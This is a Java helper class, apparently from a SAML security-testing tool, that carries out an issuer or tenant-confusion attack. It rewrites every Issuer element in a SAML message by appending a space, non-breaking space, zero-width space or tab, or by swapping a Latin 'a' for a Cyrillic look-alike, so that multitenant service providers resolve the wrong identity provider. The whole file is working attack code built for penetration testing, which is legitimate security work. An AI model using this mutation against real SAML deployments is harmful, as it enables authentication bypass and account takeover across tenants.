package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Issuer / tenant-confusion by appending invisible-but-different characters
/// to the Issuer text, exploiting multitenant SPs that pick the wrong IdP
/// based on a loose Issuer lookup. See HackerOne #976603 (Shopify, "IdP1 "
/// with trailing space) and the "Multitenant" slide in the KazHackStan deck.
///
/// Modes enumerate the different invisible-or-near-invisible postfixes worth
/// trying: ASCII SP, NBSP, zero-width space, tab, and a full-width Latin char.
public class IssuerConfusion {

    public enum Mode {
        TRAILING_SPACE("Trailing ASCII space"),
        TRAILING_NBSP("Trailing NBSP (U+00A0)"),
        TRAILING_ZWSP("Trailing zero-width space (U+200B)"),
        TRAILING_TAB("Trailing tab (\\t)"),
        // Latin small letter 'a' vs Cyrillic small letter 'a' (U+0430) — identical glyph.
        HOMOGLYPH_LATIN_A_TO_CYRILLIC("Replace first 'a' with Cyrillic U+0430");

        private final String label;
        Mode(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    /// Mutates the text content of every Issuer element according to the mode.
    public static String apply(String samlMessage, Mode mode) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList issuers = document.getElementsByTagNameNS("*", "Issuer");
        if (issuers.getLength() == 0) {
            throw new IllegalArgumentException("No Issuer element found in SAML message.");
        }

        for (int i = 0; i < issuers.getLength(); i++) {
            String original = issuers.item(i).getTextContent();
            issuers.item(i).setTextContent(transform(original, mode));
        }
        return xmlHelpers.getString(document);
    }

    private static String transform(String input, Mode mode) {
        return switch (mode) {
            case TRAILING_SPACE -> input + " ";
            case TRAILING_NBSP  -> input + " ";
            case TRAILING_ZWSP  -> input + "​";
            case TRAILING_TAB   -> input + "\t";
            case HOMOGLYPH_LATIN_A_TO_CYRILLIC -> input.replaceFirst("a", "а");
        };
    }

    private IssuerConfusion() {}
}
